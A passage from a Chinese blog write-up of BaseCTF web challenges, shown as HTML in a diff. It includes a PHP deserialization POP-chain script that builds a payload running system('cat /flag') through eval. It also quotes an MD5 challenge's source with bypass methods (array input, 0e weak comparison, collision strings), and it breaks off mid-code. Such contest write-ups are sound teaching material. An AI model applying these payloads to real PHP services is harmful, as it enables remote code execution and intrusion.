@@ -1,0 +1,1371 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="[Week2] Really EZ POP 这道题记录一下的原因是因为这个php版本太低导致我们不能通过更改成员变量的属性来构造pop利用链，开始我就犯了这个错。不能改变属性可以使用在类内部写入构造方法来构造链子\n">
+<title>BaseCTF招新赛 Web Wp</title>
+
+<link rel='canonical' href='http://gucheng.me/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-web-wp/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="BaseCTF招新赛 Web Wp">
+<meta property='og:description' content="[Week2] Really EZ POP 这道题记录一下的原因是因为这个php版本太低导致我们不能通过更改成员变量的属性来构造pop利用链，开始我就犯了这个错。不能改变属性可以使用在类内部写入构造方法来构造链子\n">
+<meta property='og:url' content='http://gucheng.me/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-web-wp/'>
+<meta property='og:site_name' content='gucheNg'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-09-12T17:26:54&#43;08:00'/><meta property='article:modified_time' content='2024-09-12T17:26:54&#43;08:00'/>
+<meta name="twitter:title" content="BaseCTF招新赛 Web Wp">
+<meta name="twitter:description" content="[Week2] Really EZ POP 这道题记录一下的原因是因为这个php版本太低导致我们不能通过更改成员变量的属性来构造pop利用链，开始我就犯了这个错。不能改变属性可以使用在类内部写入构造方法来构造链子\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu14707525476735327744.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">gucheNg</a></h1>
+            <h2 class="site-description">欢迎来到我的博客，偶尔会分享一些关于CTF和渗透的东西，摸鱼选手一枚.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/1778687393'
+                        target="_blank"
+                        title="bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://blog.csdn.net/weixin_73399382'
+                        target="_blank"
+                        title="csdn"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1725886844926" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4556" width="32" height="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M530.9293681 431.99298667c12.69089853-1.39850077 32.17241993-2.81598184 58.96997255-2.81598184 44.75202505 0 80.92755642 7.8957922 103.33549032 24.51560657 20.13547797 15.48790009 33.52519552 40.55565997 29.81627827 76.89597458-3.43197786 33.81076231-20.74198383 57.48864879-45.99437 72.12071127C653.95861373 616.52261991 624.87825229 622.43066023 581.11147578 622.43066023c-25.78555916 0-50.402969-1.41748106-69.11147578-4.22397275l18.9293681-186.21370082z m36.98564379 149.2013121c4.29730562 0.85583762 9.97499448 1.70218509 21.16558896 1.7021851 44.76151521 0 76.3265665-22.32511089 79.51007536-53.69690853 4.60098993-45.34127616-23.40180983-61.20619343-70.57468202-60.93011679-6.10129397 0-14.59496468 0-19.09501409 0.83685734L567.90552174 581.20378891h0.0086274z m192.82056016-142.09665206c181.99921821-34.39915066 197.70797962 27.4144114 192.08550608 82.12331343L942.21024461 622.43066023h-57.75523531l9.67131017-92.30191443c2.08955515-20.32786888 15.10225553-60.09239669-47.74228028-58.59209265-21.7272324 0.52454563-32.53131957 3.50617346-32.53131957 3.50617347s-1.88594862 24.56133176-4.16875743 42.71768524L798.70560163 622.43066023h-56.64143855l11.23631967-103.16035419" fill="#231916" p-id="4557"></path><path d="M265.80433314 616.11799508c-10.67553898 3.74515232-32.81688637 6.31266516-63.76507889 6.31266515C113.06923991 622.43066023 65.05951037 580.09861956 70.72857184 524.15600002c6.80960313-66.67251112 77.93643846-104.18183779 155.82628898-104.18183779 30.17517791 0 47.92690654 2.46657234 64.58381871 6.58960456l-5.35588702 44.91767104c-11.06118355-3.78225011-37.00289858-7.25218852-58.00370429-7.25218852-45.84684153 0-84.76415912 13.84093033-89.22797347 57.59907945-3.97550376 39.12955153 23.3465945 57.8380583 74.89959531 57.8380583 17.94498229 0 44.41124294-2.60461066 56.64143856-6.35839035l-4.30679575 42.79188083 0.01898028 0.01725479z" fill="#C92027" p-id="4558"></path><path d="M305.55937083 570.68440578c16.63793189 5.83470746 51.32264935 11.65043465 79.37203705 11.65043465 30.2209031 0 47.04346126-8.05194806 48.39623685-20.53061266 1.22336465-11.39247553-11.15349668-12.92987738-45.28606084-20.71437619-47.16338205-11.12675175-77.25573697-28.3349545-74.3103442-55.82356149C317.17270769 453.32508436 361.6115583 429.17700483 429.80249098 429.17700483c33.26723639 0 65.49487164 2.25433839 82.19750902 7.51877503l-5.74239433 40.26060304c-10.84032224-3.62523151-52.34413295-8.65931669-80.41163819-8.65931669-28.46350268 0-43.19736842 8.60410136-44.21885202 18.04592281-1.28807011 11.94549158 13.50963835 12.49764488 50.49441939 21.95758387 50.06218689 12.2120781 71.95506527 29.41079069 69.09335825 56.07116773C497.85538535 595.77977332 457.87085896 622.43066023 378.02949161 622.43066023c-33.23962873 0-61.89638506-5.83470746-77.68796948-11.66855218l5.21784869-40.07770228z" fill="#231916" p-id="4559"></path></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/2477231995/'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#week2-really-ez-pop">[Week2] Really EZ POP</a></li>
+            <li><a href="#week2-所以你说你懂-md5">[Week2] 所以你说你懂 MD5?</a></li>
+            <li><a href="#week2-你听不到我的声音">[Week2] 你听不到我的声音</a></li>
+            <li><a href="#week2-数学大师">[Week2] 数学大师</a></li>
+            <li><a href="#week3-复读机">[Week3] 复读机</a></li>
+            <li><a href="#week3-滤个不停">[Week3] 滤个不停</a></li>
+            <li><a href="#week4-no-jwt">[Week4] No JWT</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-web-wp/">BaseCTF招新赛 Web Wp</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2024-09-12</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h4 id="week2-really-ez-pop">[Week2] Really EZ POP
+</h4><p>这道题记录一下的原因是因为这个php版本太低导致我们不能通过更改成员变量的属性来构造pop利用链，开始我就犯了这个错。不能改变属性可以使用在类内部写入构造方法来构造链子</p>
+<p>wp如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Sink</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$cmd</span> <span class="o">=</span> <span class="s1">&#39;echo 123;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="s1">&#39;system(\&#39;cat /flag\&#39;);&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Shark</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$word</span> <span class="o">=</span> <span class="s1">&#39;Hello, World!&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">word</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Sink</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;Shark says:&#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">word</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Sea</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$animal</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">animal</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Shark</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$sea_ani</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">animal</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;In a deep deep sea, there is a &#39;</span> <span class="o">.</span> <span class="nv">$sea_ani</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Nature</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$sea</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sea</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Sea</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sea</span><span class="o">-&gt;</span><span class="na">see</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ser</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Nature</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$ser</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<h4 id="week2-所以你说你懂-md5">[Week2] 所以你说你懂 MD5?
+</h4><p>这道题当时是真不会哈希长度扩展攻击，题目源码如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">session_start();
+</span></span><span class="line"><span class="cl">highlight_file(__FILE__);
+</span></span><span class="line"><span class="cl">// 所以你说你懂 MD5 了?
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$apple = $_POST[&#39;apple&#39;];
+</span></span><span class="line"><span class="cl">$banana = $_POST[&#39;banana&#39;];
+</span></span><span class="line"><span class="cl">if (!($apple !== $banana &amp;&amp; md5($apple) === md5($banana))) {
+</span></span><span class="line"><span class="cl">    die(&#39;加强难度就不会了?&#39;);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// 什么? 你绕过去了?
+</span></span><span class="line"><span class="cl">// 加大剂量!
+</span></span><span class="line"><span class="cl">// 我要让他成为 string
+</span></span><span class="line"><span class="cl">$apple = (string)$_POST[&#39;appple&#39;];
+</span></span><span class="line"><span class="cl">$banana = (string)$_POST[&#39;bananana&#39;];
+</span></span><span class="line"><span class="cl">if (!((string)$apple !== (string)$banana &amp;&amp; md5((string)$apple) == md5((string)$banana))) {
+</span></span><span class="line"><span class="cl">    die(&#39;难吗?不难!&#39;);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// 你还是绕过去了?
+</span></span><span class="line"><span class="cl">// 哦哦哦, 我少了一个等于号
+</span></span><span class="line"><span class="cl">$apple = (string)$_POST[&#39;apppple&#39;];
+</span></span><span class="line"><span class="cl">$banana = (string)$_POST[&#39;banananana&#39;];
+</span></span><span class="line"><span class="cl">if (!((string)$apple !== (string)$banana &amp;&amp; md5((string)$apple) === md5((string)$banana))) {
+</span></span><span class="line"><span class="cl">    die(&#39;嘻嘻, 不会了? 没看直播回放?&#39;);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// 你以为这就结束了
+</span></span><span class="line"><span class="cl">if (!isset($_SESSION[&#39;random&#39;])) {
+</span></span><span class="line"><span class="cl">    $_SESSION[&#39;random&#39;] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// 你想看到 random 的值吗?
+</span></span><span class="line"><span class="cl">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧
+</span></span><span class="line"><span class="cl">$random = $_SESSION[&#39;random&#39;];
+</span></span><span class="line"><span class="cl">echo md5($random);
+</span></span><span class="line"><span class="cl">echo &#39;&lt;br /&gt;&#39;;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$name = $_POST[&#39;name&#39;] ?? &#39;user&#39;;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// check if name ends with &#39;admin&#39;
+</span></span><span class="line"><span class="cl">if (substr($name, -5) !== &#39;admin&#39;) {
+</span></span><span class="line"><span class="cl">    die(&#39;不是管理员也来凑热闹?&#39;);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$md5 = $_POST[&#39;md5&#39;];
+</span></span><span class="line"><span class="cl">if (md5($random . $name) !== $md5) {
+</span></span><span class="line"><span class="cl">    die(&#39;伪造? NO NO NO!&#39;);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// 认输了, 看样子你真的很懂 MD5
+</span></span><span class="line"><span class="cl">// 那 flag 就给你吧
+</span></span><span class="line"><span class="cl">echo &#34;看样子你真的很懂 MD5&#34;;
+</span></span><span class="line"><span class="cl">echo file_get_contents(&#39;/flag&#39;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>第一个比较可以利用传入数组，因为md5函数不能处理数组返回null，两个null自然相等</p>
+<p>第二个比较是弱比较，我们可以利用科学计数法0e开头的字符串传参进行绕过</p>
+<p>第三个比较用了string强制类型转换，我们可以使用工具<a class="link" href="https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip"  target="_blank" rel="noopener"
+    >fastcoll</a>生成两个md5值相同的字符串，原理就是<strong>原本payload字符串中含有多种空白符号，MD5加密后hash值相等(空白符号不影响md5值)。但是我们上传参数时会自动进行一次url解码，这样过后因为空白字符两个url就不相等了，从而成功绕过</strong>，也可以上网找一些相等的，我这里给出一组</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
